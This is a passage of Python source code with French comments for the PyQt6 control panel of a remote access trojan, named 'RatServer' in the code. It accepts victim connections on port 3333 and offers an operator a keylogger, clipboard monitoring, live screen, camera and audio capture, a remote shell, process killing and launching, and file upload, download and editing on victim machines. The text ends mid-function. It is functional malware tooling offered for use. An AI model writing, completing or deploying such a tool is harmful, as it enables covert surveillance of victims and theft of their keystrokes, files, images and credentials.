import sys
import json
import socket
import threading
import base64
import os
import time
import mimetypes
import shutil
import logging
from datetime import datetime
from pathlib import Path
from PyQt6.QtWidgets import *
from PyQt6.QtCore import *
from PyQt6.QtGui import *
import platform

# Configuration du logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class RatServer(QMainWindow):
    # Définir les signaux
    client_connected = pyqtSignal(tuple)
    client_disconnected = pyqtSignal(tuple)
    system_info_received = pyqtSignal(tuple, dict)
    process_list_received = pyqtSignal(tuple, list)
    directory_listing_received = pyqtSignal(tuple, list)
    keylog_received = pyqtSignal(tuple, str)
    clipboard_received = pyqtSignal(tuple, str)
    screenshot_received = pyqtSignal(tuple, str)
    shell_output_received = pyqtSignal(tuple, str)
    file_data_received = pyqtSignal(tuple, str)
    file_content_received = pyqtSignal(tuple, str)
    camera_frame_received = pyqtSignal(tuple, str)
    audio_data_received = pyqtSignal(tuple, str)  # Nouveau signal pour l'audio
    
    def __init__(self):
        super().__init__()
        
        # Connecter les signaux
        self.client_connected.connect(self.handle_client_connected)
        self.client_disconnected.connect(self.handle_client_disconnected)
        self.system_info_received.connect(self.update_client_info)
        self.process_list_received.connect(self.update_process_list)
        self.directory_listing_received.connect(self.update_directory_listing)
        self.keylog_received.connect(self.update_keylog)
        self.clipboard_received.connect(self.update_clipboard)
        self.screenshot_received.connect(self.update_screenshot)
        self.shell_output_received.connect(self.update_shell_output)
        self.file_data_received.connect(self.handle_file_data)
        self.file_content_received.connect(self.handle_file_content)
        self.camera_frame_received.connect(self.update_camera_frame)
        self.audio_data_received.connect(self.update_audio_data)
        
        self.setWindowTitle("Remote Access Tool - Control Panel")
        self.setMinimumSize(1200, 800)
        
        # Variables
        self.clients = {}
        self.current_paths = {}
        self.selected_client = None
        # Utiliser le bon chemin de base selon le système d'exploitation
        if platform.system() == 'Windows':
            self.download_path = os.path.expanduser("~/Downloads")
            self.temp_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", "RAT")
        else:
            self.download_path = os.path.expanduser("~/Downloads")
            self.temp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp")
            
        os.makedirs(self.temp_dir, exist_ok=True)
        self.screenshot_interval = 100  # Intervalle par défaut de 100ms
        
        # Style
        self.setStyleSheet("""
            QMainWindow {
                background-color: #2b2b2b;
                color: #ffffff;
            }
            QTabWidget::pane {
                border: 1px solid #444444;
                background-color: #2b2b2b;
            }
            QTabBar::tab {
                background-color: #363636;
                color: #ffffff;
                padding: 8px 20px;
                border: none;
                margin-right: 2px;
            }
            QTabBar::tab:selected {
                background-color: #0d47a1;
            }
            QTableWidget {
                background-color: #363636;
                color: #ffffff;
                gridline-color: #444444;
                border: none;
            }
            QTableWidget::item:selected {
                background-color: #0d47a1;
            }
            QHeaderView::section {
                background-color: #2b2b2b;
                color: #ffffff;
                padding: 5px;
                border: none;
            }
            QPushButton {
                background-color: #0d47a1;
                color: white;
                border: none;
                padding: 8px 15px;
                border-radius: 4px;
            }
            QPushButton:hover {
                background-color: #1565c0;
            }
            QPushButton:pressed {
                background-color: #0a3d91;
            }
            QLineEdit, QTextEdit {
                background-color: #363636;
                color: #ffffff;
                border: 1px solid #444444;
                padding: 5px;
                border-radius: 4px;
            }
            QGroupBox {
                border: 1px solid #444444;
                margin-top: 10px;
                color: #ffffff;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 3px;
            }
        """)
        
        # Layout principal
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        main_layout = QHBoxLayout(main_widget)
        
        # Panneau de gauche (Clients)
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        
        # Liste des clients
        clients_group = QGroupBox("Connected Clients")
        clients_layout = QVBoxLayout(clients_group)
        
        self.clients_table = QTableWidget()
        self.clients_table.setColumnCount(5)
        self.clients_table.setHorizontalHeaderLabels(["IP:Port", "Hostname", "OS", "CPU", "Memory"])
        self.clients_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        self.clients_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.clients_table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.clients_table.itemSelectionChanged.connect(self.on_client_selected)
        clients_layout.addWidget(self.clients_table)
        
        left_layout.addWidget(clients_group)
        
        # Panneau de droite (Tabs)
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        
        # Tabs
        tabs = QTabWidget()
        
        # Tab Système
        system_tab = QWidget()
        system_layout = QVBoxLayout(system_tab)
        
        # Informations système
        system_info_group = QGroupBox("System Information")
        system_info_layout = QFormLayout(system_info_group)
        
        self.hostname_label = QLabel("N/A")
        self.os_label = QLabel("N/A")
        self.cpu_label = QLabel("0%")
        self.memory_label = QLabel("0%")
        
        system_info_layout.addRow("Hostname:", self.hostname_label)
        system_info_layout.addRow("OS:", self.os_label)
        system_info_layout.addRow("CPU Usage:", self.cpu_label)
        system_info_layout.addRow("Memory Usage:", self.memory_label)
        
        system_layout.addWidget(system_info_group)
        
        # Processus
        processes_group = QGroupBox("Processes")
        processes_layout = QVBoxLayout(processes_group)
        
        self.process_table = QTableWidget()
        self.process_table.setColumnCount(5)
        self.process_table.setHorizontalHeaderLabels(["PID", "Name", "CPU %", "Memory %", "Status"])
        self.process_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        
        process_buttons = QHBoxLayout()
        refresh_btn = QPushButton("🔄 Refresh")
        kill_btn = QPushButton("❌ Kill Process")
        start_btn = QPushButton("▶️ Start Process")
        
        refresh_btn.clicked.connect(self.refresh_processes)
        kill_btn.clicked.connect(self.kill_process)
        start_btn.clicked.connect(self.start_process)
        
        process_buttons.addWidget(refresh_btn)
        process_buttons.addWidget(kill_btn)
        process_buttons.addWidget(start_btn)
        
        processes_layout.addWidget(self.process_table)
        processes_layout.addLayout(process_buttons)
        
        system_layout.addWidget(processes_group)
        
        # Tab Fichiers
        files_tab = QWidget()
        files_layout = QVBoxLayout(files_tab)
        
        # Navigation
        nav_layout = QHBoxLayout()
        self.path_edit = QLineEdit()
        self.path_edit.setReadOnly(True)
        nav_layout.addWidget(self.path_edit)
        
        # Boutons de navigation
        nav_buttons = QHBoxLayout()
        up_btn = QPushButton("⬆️ Up")
        refresh_files_btn = QPushButton("🔄 Refresh")
        new_dir_btn = QPushButton("📁 New Folder")
        upload_btn = QPushButton("⬆️ Upload")
        download_btn = QPushButton("⬇️ Download")
        view_btn = QPushButton("👁️ View")
        rename_btn = QPushButton("✏️ Rename")
        edit_btn = QPushButton("📝 Edit")
        
        up_btn.clicked.connect(self.go_up)
        refresh_files_btn.clicked.connect(self.refresh_files)
        new_dir_btn.clicked.connect(self.create_directory)
        upload_btn.clicked.connect(self.upload_file)
        download_btn.clicked.connect(self.download_selected_file)
        view_btn.clicked.connect(self.view_file)
        rename_btn.clicked.connect(self.rename_file)
        edit_btn.clicked.connect(self.edit_file)
        
        nav_buttons.addWidget(up_btn)
        nav_buttons.addWidget(refresh_files_btn)
        nav_buttons.addWidget(new_dir_btn)
        nav_buttons.addWidget(upload_btn)
        nav_buttons.addWidget(download_btn)
        nav_buttons.addWidget(view_btn)
        nav_buttons.addWidget(rename_btn)
        nav_buttons.addWidget(edit_btn)
        
        files_layout.addLayout(nav_layout)
        files_layout.addLayout(nav_buttons)
        
        # Liste des fichiers
        self.files_table = QTableWidget()
        self.files_table.setColumnCount(4)
        self.files_table.setHorizontalHeaderLabels(["Name", "Type", "Size", "Modified"])
        self.files_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        self.files_table.itemDoubleClicked.connect(self.on_file_double_clicked)
        files_layout.addWidget(self.files_table)
        
        # Tab Surveillance
        monitoring_tab = QWidget()
        monitoring_layout = QVBoxLayout(monitoring_tab)
        
        # Keylogger
        keylogger_group = QGroupBox("Keylogger")
        keylogger_layout = QVBoxLayout(keylogger_group)
        
        keylogger_buttons = QHBoxLayout()
        start_keylogger_btn = QPushButton("▶️ Start Keylogger")
        stop_keylogger_btn = QPushButton("⏹️ Stop Keylogger")
        clear_keylog_btn = QPushButton("🗑️ Clear Log")
        
        start_keylogger_btn.clicked.connect(self.start_keylogger)
        stop_keylogger_btn.clicked.connect(self.stop_keylogger)
        clear_keylog_btn.clicked.connect(lambda: self.keylog_text.clear())
        
        keylogger_buttons.addWidget(start_keylogger_btn)
        keylogger_buttons.addWidget(stop_keylogger_btn)
        keylogger_buttons.addWidget(clear_keylog_btn)
        
        self.keylog_text = QTextEdit()
        self.keylog_text.setReadOnly(True)
        
        keylogger_layout.addLayout(keylogger_buttons)
        keylogger_layout.addWidget(self.keylog_text)
        
        monitoring_layout.addWidget(keylogger_group)
        
        # Clipboard Monitor
        clipboard_group = QGroupBox("Clipboard Monitor")
        clipboard_layout = QVBoxLayout(clipboard_group)
        
        clipboard_buttons = QHBoxLayout()
        start_clipboard_btn = QPushButton("▶️ Start Monitor")
        stop_clipboard_btn = QPushButton("⏹️ Stop Monitor")
        clear_clipboard_btn = QPushButton("🗑️ Clear Log")
        
        start_clipboard_btn.clicked.connect(self.start_clipboard_monitor)
        stop_clipboard_btn.clicked.connect(self.stop_clipboard_monitor)
        clear_clipboard_btn.clicked.connect(lambda: self.clipboard_text.clear())
        
        clipboard_buttons.addWidget(start_clipboard_btn)
        clipboard_buttons.addWidget(stop_clipboard_btn)
        clipboard_buttons.addWidget(clear_clipboard_btn)
        
        self.clipboard_text = QTextEdit()
        self.clipboard_text.setReadOnly(True)
        
        clipboard_layout.addLayout(clipboard_buttons)
        clipboard_layout.addWidget(self.clipboard_text)
        
        monitoring_layout.addWidget(clipboard_group)
        
        # Tab Remote Control
        remote_tab = QWidget()
        remote_layout = QVBoxLayout(remote_tab)
        
        # Screen Capture
        screen_group = QGroupBox("Screen Capture")
        screen_layout = QVBoxLayout(screen_group)
        
        screen_controls = QHBoxLayout()
        
        # Contrôles d'intervalle
        interval_layout = QHBoxLayout()
        interval_layout.addWidget(QLabel("Interval (ms):"))
        self.interval_slider = QSlider(Qt.Orientation.Horizontal)
        self.interval_slider.setRange(50, 1000)
        self.interval_slider.setValue(100)
        self.interval_slider.valueChanged.connect(self.update_interval)
        interval_layout.addWidget(self.interval_slider)
        
        # Contrôles de zoom
        zoom_layout = QHBoxLayout()
        zoom_layout.addWidget(QLabel("Zoom:"))
        self.zoom_slider = QSlider(Qt.Orientation.Horizontal)
        self.zoom_slider.setRange(10, 200)  # 10% à 200%
        self.zoom_slider.setValue(100)  # 100% par défaut
        self.zoom_slider.valueChanged.connect(self.update_zoom)
        zoom_layout.addWidget(self.zoom_slider)
        self.zoom_label = QLabel("100%")  # Créer une référence au label
        zoom_layout.addWidget(self.zoom_label)
        
        # Boutons de capture
        self.start_screen_btn = QPushButton("▶️ Start Capture")
        self.stop_screen_btn = QPushButton("⏹️ Stop Capture")
        self.start_screen_btn.clicked.connect(self.start_screen_capture)
        self.stop_screen_btn.clicked.connect(self.stop_screen_capture)
        
        controls_layout = QVBoxLayout()
        controls_layout.addLayout(interval_layout)
        controls_layout.addLayout(zoom_layout)
        
        screen_controls.addLayout(controls_layout)
        screen_controls.addWidget(self.start_screen_btn)
        screen_controls.addWidget(self.stop_screen_btn)
        
        # Zone de défilement pour l'image
        self.scroll_area = QScrollArea()
        self.scroll_area.setWidgetResizable(True)
        self.scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
        self.scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
        
        # Label pour l'image
        self.screen_label = QLabel()
        self.screen_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.screen_label.setMinimumSize(640, 480)  # Taille minimale
        
        # Ajouter le label au scroll area
        self.scroll_area.setWidget(self.screen_label)
        
        screen_layout.addLayout(screen_controls)
        screen_layout.addWidget(self.scroll_area)
        
        remote_layout.addWidget(screen_group)
        
        # Shell
        shell_group = QGroupBox("Remote Shell")
        shell_layout = QVBoxLayout(shell_group)
        
        # Zone de sortie du shell avec style terminal
        self.shell_output = QTextEdit()
        self.shell_output.setReadOnly(True)
        self.shell_output.setStyleSheet("""
            QTextEdit {
                background-color: #1E1E1E;
                color: #00FF00;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                border: 1px solid #444444;
                padding: 5px;
            }
        """)
        self.shell_output.append("Remote Shell - Connected to remote system\n")
        self.shell_output.append("Type your commands below\n")
        self.shell_output.append("----------------------------------------\n")
        
        # Zone de saisie avec style terminal
        input_container = QWidget()
        input_layout = QHBoxLayout(input_container)
        input_layout.setContentsMargins(0, 0, 0, 0)
        
        prompt_label = QLabel("$")
        prompt_label.setStyleSheet("""
            QLabel {
                color: #00FF00;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                padding: 5px;
            }
        """)
        
        self.shell_input = QLineEdit()
        self.shell_input.setPlaceholderText("Enter command...")
        self.shell_input.returnPressed.connect(self.send_shell_command)
        self.shell_input.setStyleSheet("""
            QLineEdit {
                background-color: #1E1E1E;
                color: #00FF00;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                border: 1px solid #444444;
                padding: 5px;
            }
        """)
        
        input_layout.addWidget(prompt_label)
        input_layout.addWidget(self.shell_input)
        
        shell_layout.addWidget(self.shell_output)
        shell_layout.addWidget(input_container)
        
        remote_layout.addWidget(shell_group)
        
        # Audio
        audio_group = QGroupBox("Audio Capture")
        audio_layout = QVBoxLayout(audio_group)
        
        audio_buttons = QHBoxLayout()
        start_audio_btn = QPushButton("Start Audio Capture")
        start_audio_btn.clicked.connect(self.start_audio_capture)
        stop_audio_btn = QPushButton("Stop Audio Capture")
        stop_audio_btn.clicked.connect(self.stop_audio_capture)
        
        audio_buttons.addWidget(start_audio_btn)
        audio_buttons.addWidget(stop_audio_btn)
        
        self.audio_status = QLabel("Audio capture stopped")
        self.audio_status.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        audio_layout.addLayout(audio_buttons)
        audio_layout.addWidget(self.audio_status)
        
        remote_layout.addWidget(audio_group)
        
        # Caméra
        camera_group = QGroupBox("Camera")
        camera_layout = QVBoxLayout(camera_group)
        
        camera_buttons = QHBoxLayout()
        start_camera_btn = QPushButton("Start Camera")
        start_camera_btn.clicked.connect(self.start_camera)
        stop_camera_btn = QPushButton("Stop Camera")
        stop_camera_btn.clicked.connect(self.stop_camera)
        
        camera_buttons.addWidget(start_camera_btn)
        camera_buttons.addWidget(stop_camera_btn)
        
        self.camera_label = QLabel()
        self.camera_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.camera_label.setMinimumSize(640, 480)
        self.camera_label.setStyleSheet("QLabel { background-color: black; }")
        
        camera_layout.addLayout(camera_buttons)
        camera_layout.addWidget(self.camera_label)
        
        # Ajouter les tabs
        tabs.addTab(system_tab, "💻 System")
        tabs.addTab(files_tab, "📁 Files")
        tabs.addTab(monitoring_tab, "👁️ Monitoring")
        tabs.addTab(remote_tab, "🎮 Remote Control")
        tabs.addTab(camera_group, "🎥 Camera")
        
        # Ajouter les panneaux au layout principal
        main_layout.addWidget(left_panel, 1)
        main_layout.addWidget(tabs, 2)
        
        # Démarrer le serveur
        self.server_thread = None
        self.server_running = True
        self.start_server()
        
        # Timer pour mettre à jour l'interface
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.update_ui)
        self.update_timer.start(1000)

    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', 3333))
            self.server_socket.listen(5)
            
            self.server_thread = threading.Thread(target=self.accept_clients)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            logger.info("Serveur démarré sur 0.0.0.0:8080")
            
        except Exception as e:
            logger.error(f"Erreur de démarrage du serveur: {e}")
            QMessageBox.critical(self, "Error", f"Failed to start server: {str(e)}")
            self.close()

    def accept_clients(self):
        while self.server_running:
            try:
                client_socket, address = self.server_socket.accept()
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket, address))
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                if self.server_running:
                    logger.error(f"Error accepting client: {e}")

    def handle_client(self, client_socket, address):
        """Gère la connexion avec un client."""
        addr_str = f"{address[0]}:{address[1]}"
        logger.info(f"Gestion du client {addr_str}")
        
        # Ajouter le client au dictionnaire dès la connexion
        self.clients[addr_str] = {
            'socket': client_socket,
            'hostname': 'Unknown',
            'os': 'Unknown',
            'cpu': 0.0,
            'memory': 0.0,
            'status': 'Connected'
        }
        
        # Émettre le signal de connexion
        self.client_connected.emit(address)
        
        try:
            while True:
                data = client_socket.recv(1048576)  # 1MB buffer
                if not data:
                    break
                    
                try:
                    message = json.loads(data.decode())
                    msg_type = message.get('type')
                    
                    if msg_type == 'system_info':
                        self.system_info_received.emit(address, message['data'])
                    elif msg_type == 'command_response':
                        cmd = message.get('command')
                        cmd_data = message.get('data', {})
                        
                        if cmd == 'list_processes':
                            self.process_list_received.emit(address, cmd_data)
                        elif cmd == 'list_directory':
                            print(f"\n[DEBUG] Données de liste de répertoire reçues: {cmd_data}")
                            if isinstance(cmd_data, dict) and 'entries' in cmd_data:
                                entries = cmd_data['entries']
                                print(f"[DEBUG] Émission du signal avec {len(entries)} entrées")
                                self.directory_listing_received.emit(address, entries)
                            else:
                                print(f"[DEBUG] Format de données invalide: {cmd_data}")
                        elif cmd == 'read_file':
                            content = cmd_data.get('content', '') if isinstance(cmd_data, dict) else cmd_data
                            self.file_content_received.emit(address, content)
                        elif cmd == 'write_file':
                            logger.debug(f"Fichier écrit avec succès sur {addr_str}")
                            QTimer.singleShot(500, self.refresh_files)
                        elif cmd == 'rename_file':
                            logger.debug(f"Fichier renommé avec succès sur {addr_str}")
                            QTimer.singleShot(500, self.refresh_files)
                        elif cmd == 'keylog':
                            self.keylog_received.emit(address, cmd_data)
                        elif cmd == 'clipboard':
                            self.clipboard_received.emit(address, cmd_data)
                        elif cmd == 'screenshot':
                            self.screenshot_received.emit(address, cmd_data)
                        elif cmd == 'shell_output':
                            self.shell_output_received.emit(address, cmd_data)
                        elif cmd == 'camera':
                            self.camera_frame_received.emit(address, cmd_data)
                        elif cmd == 'audio':
                            self.audio_data_received.emit(address, cmd_data)
                except json.JSONDecodeError as e:
                    logger.error(f"JSON decode error from {addr_str}: {e}")
                except Exception as e:
                    logger.error(f"Error receiving data from {addr_str}: {e}")
                    break
        except Exception as e:
            logger.error(f"Client handler error for {addr_str}: {e}")
        finally:
            logger.info(f"Déconnexion du client {addr_str}")
            self.client_disconnected.emit(address)
            if addr_str in self.clients:
                del self.clients[addr_str]
            client_socket.close()

    def update_ui(self):
        try:
            # Mettre à jour la table des clients
            self.clients_table.setRowCount(len(self.clients))
            for row, (addr, info) in enumerate(self.clients.items()):
                self.clients_table.setItem(row, 0, QTableWidgetItem(addr))
                self.clients_table.setItem(row, 1, QTableWidgetItem(info['hostname']))
                self.clients_table.setItem(row, 2, QTableWidgetItem(info['os']))
                self.clients_table.setItem(row, 3, QTableWidgetItem(f"{info['cpu']:.1f}%"))
                self.clients_table.setItem(row, 4, QTableWidgetItem(f"{info['memory']:.1f}%"))
                
            # Mettre à jour les informations système si un client est sélectionné
            if self.selected_client and self.selected_client in self.clients:
                info = self.clients[self.selected_client]
                self.hostname_label.setText(info['hostname'])
                self.os_label.setText(info['os'])
                self.cpu_label.setText(f"{info['cpu']:.1f}%")
                self.memory_label.setText(f"{info['memory']:.1f}%")
                
        except Exception as e:
            print(f"Error updating UI: {e}")

    def on_client_selected(self):
        selected_items = self.clients_table.selectedItems()
        if selected_items:
            self.selected_client = selected_items[0].text()
            self.refresh_processes()
            self.list_directory()
        else:
            self.selected_client = None

    def send_command(self, address, command):
        """Envoie une commande à un client spécifique."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str not in self.clients:
            logger.warning(f"Client {addr_str} non trouvé dans le dictionnaire")
            return False
            
        client_socket = self.clients[addr_str].get('socket')
        if not client_socket:
            logger.warning(f"Socket non disponible pour le client {addr_str}")
            return False
            
        try:
            # Préparer le message
            message = {
                'type': 'command',
                'command': command['command'],
                'data': command.get('data', {})
            }
            data = json.dumps(message).encode()
            
            # Envoyer la taille puis le message
            size = len(data)
            client_socket.sendall(size.to_bytes(8, byteorder='big'))
            client_socket.sendall(data)
            
            logger.debug(f"Commande envoyée à {addr_str}: {command['command']}")
            return True
            
        except Exception as e:
            logger.error(f"Erreur d'envoi de commande à {addr_str}: {str(e)}")
            self.remove_client(address)
            return False

    def update_client_info(self, address, info):
        """Met à jour les informations du client dans la liste des clients."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str not in self.clients:
            self.clients[addr_str] = {
                'socket': None,  # Le socket sera mis à jour plus tard
                'hostname': info.get('hostname', 'Unknown'),
                'os': info.get('os', 'Unknown'),
                'cpu': info.get('cpu', 0.0),
                'memory': info.get('memory', 0.0),
                'status': 'Connected'
            }
            # Initialiser le chemin selon l'OS du client
            if 'Windows' in info.get('os', ''):
                # Pour un client Windows, utiliser son chemin utilisateur
                self.current_paths[addr_str] = os.path.expanduser("~")
                logger.info(f"Client Windows détecté pour {addr_str}, chemin initial: {self.current_paths[addr_str]}")
            else:
                # Pour un client Linux/Unix
                self.current_paths[addr_str] = os.path.expanduser("~")
                logger.info(f"Client Unix détecté pour {addr_str}, chemin initial: {self.current_paths[addr_str]}")
        else:
            self.clients[addr_str].update({
                'hostname': info.get('hostname', self.clients[addr_str]['hostname']),
                'os': info.get('os', self.clients[addr_str]['os']),
                'cpu': info.get('cpu', self.clients[addr_str]['cpu']),
                'memory': info.get('memory', self.clients[addr_str]['memory']),
                'status': 'Connected'
            })
            # Mettre à jour le chemin si l'OS a changé
            if 'Windows' in info.get('os', '') and 'Windows' not in self.clients[addr_str].get('os', ''):
                self.current_paths[addr_str] = os.path.expanduser("~")
                logger.info(f"OS changé vers Windows pour {addr_str}, mise à jour du chemin: {self.current_paths[addr_str]}")

    def remove_client(self, address):
        """Supprime un client de la liste."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str in self.clients:
            try:
                if self.clients[addr_str]['socket']:
                    self.clients[addr_str]['socket'].close()
            except:
                pass
            del self.clients[addr_str]
            if addr_str in self.current_paths:
                del self.current_paths[addr_str]
            if addr_str == self.selected_client:
                self.selected_client = None
                self.path_edit.clear()
                self.files_table.setRowCount(0)
                self.process_table.setRowCount(0)
                self.keylog_text.clear()
                self.clipboard_text.clear()
                self.shell_output.clear()
                self.hostname_label.setText("N/A")
                self.os_label.setText("N/A")
                self.cpu_label.setText("0%")
                self.memory_label.setText("0%")

    def closeEvent(self, event):
        self.server_running = False
        if hasattr(self, 'server_socket'):
            self.server_socket.close()
        event.accept()

    def refresh_processes(self):
        """Rafraîchit la liste des processus."""
        if self.selected_client:
            addr = tuple(self.selected_client.split(':'))
            self.send_command(addr, {
                'command': 'list_processes'
            })

    def kill_process(self):
        """Tue le processus sélectionné."""
        if not self.selected_client:
            return
            
        selected = self.process_table.selectedItems()
        if selected:
            pid = int(self.process_table.item(selected[0].row(), 0).text())
            addr = tuple(self.selected_client.split(':'))
            self.send_command(addr, {
                'command': 'kill_process',
                'data': {'pid': pid}
            })
            # Rafraîchir la liste après avoir tué le processus
            QTimer.singleShot(500, self.refresh_processes)

    def start_process(self):
        """Démarre un nouveau processus."""
        if not self.selected_client:
            return
            
        cmd, ok = QInputDialog.getText(
            self,
            "Démarrer un processus",
            "Entrez la commande à exécuter:"
        )
        
        if ok and cmd:
            addr = tuple(self.selected_client.split(':'))
            self.send_command(addr, {
                'command': 'start_process',
                'data': {'cmd': cmd}
            })
            # Rafraîchir la liste après avoir démarré le processus
            QTimer.singleShot(500, self.refresh_processes)

    def list_directory(self):
        """Liste le contenu du répertoire actuel."""
        if self.selected_client:
            addr = tuple(self.selected_client.split(':'))
            print(f"\n[DEBUG] Client sélectionné: {self.selected_client}")
            print(f"[DEBUG] OS du client: {self.clients[self.selected_client].get('os', 'Unknown')}")
            
            if self.selected_client not in self.current_paths:
                print("[DEBUG] Initialisation du chemin pour le client")
                # Détecter si le client est sous Windows
                if 'Windows' in self.clients[self.selected_client].get('os', ''):
                    self.current_paths[self.selected_client] = "C:\\Users\\Maxime"
                    print(f"[DEBUG] Client Windows détecté, chemin initial: {self.current_paths[self.selected_client]}")
                else:
                    self.current_paths[self.selected_client] = os.path.expanduser("~")
                    print(f"[DEBUG] Client Unix détecté, chemin initial: {self.current_paths[self.selected_client]}")
            
            current_path = self.current_paths[self.selected_client]
            print(f"[DEBUG] Chemin actuel utilisé: {current_path}")
            
            self.send_command(addr, {
                'command': 'list_directory',
                'data': {'path': current_path}
            })
            print(f"[DEBUG] Commande list_directory envoyée avec le chemin: {current_path}\n")

    def go_up(self):
        """Remonte d'un niveau dans l'arborescence."""
        if self.selected_client and self.selected_client in self.current_paths:
            current = self.current_paths[self.selected_client]
            parent = os.path.dirname(current)
            if parent != current:  # Éviter de remonter au-delà de la racine
                self.current_paths[self.selected_client] = parent
                self.list_directory()

    def refresh_files(self):
        """Rafraîchit la liste des fichiers."""
        self.list_directory()

    def create_directory(self):
        """Crée un nouveau dossier."""
        if self.selected_client:
            name, ok = QInputDialog.getText(self, "New Directory", "Enter directory name:")
            if ok and name:
                addr = tuple(self.selected_client.split(':'))
                path = os.path.join(self.current_paths[self.selected_client], name)
                self.send_command(addr, {
                    'command': 'create_directory',
                    'data': {'path': path}
                })

    def upload_file(self):
        """Upload un fichier vers le client."""
        if not self.selected_client:
            QMessageBox.warning(self, "Warning", "Please select a client first")
            return
            
        file_paths, _ = QFileDialog.getOpenFileNames(
            self,
            "Select Files to Upload",
            self.download_path,  # Commencer dans le dossier Downloads
            "All Files (*.*)"
        )
        
        if not file_paths:
            return
            
        addr = tuple(self.selected_client.split(':'))
        for file_path in file_paths:
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                    
                file_name = os.path.basename(file_path)
                # Utiliser os.path.join pour construire le chemin de manière compatible avec le système
                dest_path = os.path.join(self.current_paths[self.selected_client], file_name)
                
                self.send_command(addr, {
                    'command': 'upload_file',
                    'data': {'path': dest_path, 'file_name': file_name, 'data': base64.b64encode(data).decode()}
                })
                
            except Exception as e:
                QMessageBox.critical(
                    self,
                    "Upload Error",
                    f"Failed to upload {os.path.basename(file_path)}: {str(e)}"
                )

    def download_selected_file(self):
        """Télécharge le fichier sélectionné."""
        if not self.selected_client:
            return
            
        selected = self.files_table.selectedItems()
        if not selected:
            return
            
        file_name = selected[0].text()
        file_type = selected[1].text()
        
        if file_type != "File":
            return
            
        addr = tuple(self.selected_client.split(':'))
        file_path = os.path.join(self.current_paths[self.selected_client], file_name)
        
        # Utiliser le dossier Downloads comme emplacement par défaut
        default_path = os.path.join(self.download_path, file_name)
        save_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save File",
            default_path,
            "All Files (*.*)"
        )
        
        if save_path:
            self.download_path = save_path
            self.send_command(addr, {
                'command': 'download_file',
                'data': {'path': file_path}
            })

    def on_file_double_clicked(self, item):
        """Gère le double-clic sur un fichier."""
        if not self.selected_client:
            return
            
        row = item.row()
        file_name = self.files_table.item(row, 0).text()
        file_type = self.files_table.item(row, 1).text()
        
        if file_type == "Directory":
            new_path = os.path.join(self.current_paths[self.selected_client], file_name)
            self.current_paths[self.selected_client] = new_path
            self.list_directory()

    def update_process_list(self, address, processes):
        """Met à jour la liste des processus."""
        addr_str = f"{address[0]}:{address[1]}"
        if not self.selected_client:
            logger.debug(f"Pas de client sélectionné pour la mise à jour des processus de {addr_str}")
            return
            
        if addr_str != self.selected_client:
            logger.debug(f"Client {addr_str} non sélectionné, ignoré")
            return
            
        try:
            self.process_table.setRowCount(0)
            for process in processes:
                row = self.process_table.rowCount()
                self.process_table.insertRow(row)
                
                # PID
                pid_item = QTableWidgetItem(str(process['pid']))
                pid_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
                self.process_table.setItem(row, 0, pid_item)
                
                # Nom
                name_item = QTableWidgetItem(process['name'])
                name_item.setTextAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignVCenter)
                self.process_table.setItem(row, 1, name_item)
                
                # CPU %
                cpu_item = QTableWidgetItem(f"{process['cpu']:.1f}%")
                cpu_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
                self.process_table.setItem(row, 2, cpu_item)
                
                # Mémoire %
                memory_item = QTableWidgetItem(f"{process['memory']:.1f}%")
                memory_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
                self.process_table.setItem(row, 3, memory_item)
                
                # Statut
                status_item = QTableWidgetItem(process['status'])
                status_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
                self.process_table.setItem(row, 4, status_item)
            
            logger.debug(f"Liste des processus mise à jour pour {addr_str}: {len(processes)} processus")
        except Exception as e:
            logger.error(f"Erreur lors de la mise à jour de la liste des processus pour {addr_str}: {e}")

    def update_directory_listing(self, address, data):
        """Met à jour la liste des fichiers."""
        addr_str = f"{address[0]}:{address[1]}"
        try:
            if addr_str == self.selected_client:
                print(f"\n[DEBUG] Mise à jour de la liste des fichiers pour {addr_str}")
                print(f"[DEBUG] Type de données reçues: {type(data)}")
                print(f"[DEBUG] Contenu des données: {data}")
                
                # Vérifier si data est un dictionnaire et contient les entrées
                if isinstance(data, dict):
                    entries = data.get('entries', [])
                    if 'error' in data:
